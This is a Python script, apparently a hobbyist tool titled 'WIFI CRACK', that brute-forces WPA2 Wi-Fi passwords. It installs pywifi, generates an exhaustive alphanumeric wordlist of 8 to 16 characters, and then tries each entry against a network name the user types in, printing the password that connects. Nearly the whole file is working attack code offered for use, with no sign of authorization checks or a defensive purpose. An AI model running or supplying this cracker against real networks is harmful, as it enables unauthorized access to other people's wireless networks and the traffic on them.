import os,pywifi,pip,time,datetime
from pywifi import const
import itertools as its
#导入库
os.system("clear")
print("██╗    ██╗██╗███████╗██╗     ██████╗██████╗  █████╗  ██████╗██╗  ██╗")
print("██║    ██║██║██╔════╝██║    ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝")
print("██║ █╗ ██║██║█████╗  ██║    ██║     ██████╔╝███████║██║     █████╔╝ ")
print("██║███╗██║██║██╔══╝  ██║    ██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ")
print("╚███╔███╔╝██║██║     ██║    ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗")
print(" ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝")
print("version:0.1.0")
print("by:MarkLiu")
print(" ")
print("[1]download pywifi")
print("[2]get password")
print("[3]start to crack WIFI")

chose = int(input("what do you want to do? "))

if chose == 1:
    pip.main(["install","pywifi"])
    pip.main(["install","comtypes"])
elif chose == 2:
    ws = int(input("password generate bits(8~16): "))    # 生成密码的位数
    words = '0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'  # 大小写字母 + 数字 组合
    # words = '0123456789' # 纯数字
    r = its.product(words, repeat=ws)  # 生成密码
    dic = open(r"alphabetPass.txt", 'a')  # alphabetPass.txt 是密码本名称
    print("please wait,we need some time...")
    for i in r:#枚举法
        dic.write(''.join(i))
        dic.write(''.join('\n'))
    dic.close()
    print('complete!Please restart the script and chose “3”')
elif chose == 3:
    nameWIFI = input("What is your wifi name?")
    # 测试连接，返回链接结果
    def wifiConnect(pwd):
        # 抓取网卡接口
        wifi = pywifi.PyWiFi()
        # 获取第一个无线网卡
        ifaces = wifi.interfaces()[0]
        # 断开所有连接
        ifaces.disconnect()
        time.sleep(0.1)
        wifistatus = ifaces.status()
        if wifistatus == const.IFACE_DISCONNECTED:
            # 创建WiFi连接文件
            profile = pywifi.Profile()
            # 要连接WiFi的名称
            profile.ssid = nameWIFI
            # 网卡的开放状态
            profile.auth = const.AUTH_ALG_OPEN
            # wifi加密算法,一般wifi加密算法为wps
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            # 加密单元
            profile.cipher = const.CIPHER_TYPE_CCMP
            # 调用密码
            profile.key = pwd
            # 删除所有连接过的wifi文件
            ifaces.remove_all_network_profiles()
            # 设定新的连接文件
            tep_profile = ifaces.add_network_profile(profile)
            ifaces.connect(tep_profile)
            time.sleep(1)
            # wifi连接时间
            if ifaces.status() == const.IFACE_CONNECTED:
                return True
            else:
                return False
        else:
            print("Wifi connection already available")

        # 读取密码本


    def readPassword():
        print("Start cracking:")
        # 密码本路径
        path = "alphabetPass.txt"
        # 打开文件
        file = open(path, "r")
        while True:
            try:
                # 一行一行读取
                pad = file.readline()
                bool = wifiConnect(pad)

                if bool:
                    print("Password cracked: ", pad)
                    print("WiFi is connected automatically ")
                    break
                else:
                    # 跳出当前循环，进行下一次循环
                    print("Password cracking.... Password proofreading: ", pad)
            except:
                continue

    start = datetime.datetime.now()
    readPassword()
    end = datetime.datetime.now()
    print("When cracking the WIFI password is shared {}".format(end - start))
